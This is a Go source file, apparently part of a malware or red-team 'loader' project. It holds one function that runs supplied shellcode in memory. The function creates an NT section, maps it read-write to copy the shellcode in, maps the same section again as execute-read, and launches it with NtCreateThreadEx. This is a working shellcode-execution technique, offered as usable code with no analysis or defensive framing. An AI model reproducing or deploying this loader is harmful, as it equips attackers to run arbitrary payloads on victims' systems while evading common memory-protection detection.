package techniques

import (
	"syscall"
	"unsafe"

	"loader/internal/ntapi"
)

func NtSection(sc []byte) bool {
	secSize := int64(len(sc))
	var hSection uintptr

	r1, _, _ := ntapi.NtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		sectionAllAccess, 0,
		uintptr(unsafe.Pointer(&secSize)),
		pageExecuteReadWrite, secCommit, 0)
	if !ntSuccess(r1) {
		return false
	}

	var rwBase uintptr
	var viewSize uintptr
	r1, _, _ = ntapi.NtMapViewOfSection.Call(
		hSection, currentProcess,
		uintptr(unsafe.Pointer(&rwBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		1, 0, pageReadWrite)
	if !ntSuccess(r1) {
		syscall.CloseHandle(syscall.Handle(hSection))
		return false
	}

	copy(unsafe.Slice((*byte)(unsafe.Pointer(rwBase)), len(sc)), sc)

	var rxBase uintptr
	viewSize = 0
	r1, _, _ = ntapi.NtMapViewOfSection.Call(
		hSection, currentProcess,
		uintptr(unsafe.Pointer(&rxBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		1, 0, pageExecuteRead)
	if !ntSuccess(r1) {
		syscall.CloseHandle(syscall.Handle(hSection))
		return false
	}

	var thread uintptr
	r1, _, _ = ntapi.NtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&thread)),
		threadAllAccess, 0, currentProcess,
		rxBase, 0, 0, 0, 0, 0, 0)
	if !ntSuccess(r1) {
		syscall.CloseHandle(syscall.Handle(hSection))
		return false
	}

	ntapi.NtWaitForSingleObject.Call(thread, 0, 0)
	syscall.CloseHandle(syscall.Handle(thread))
	syscall.CloseHandle(syscall.Handle(hSection))
	return true
}
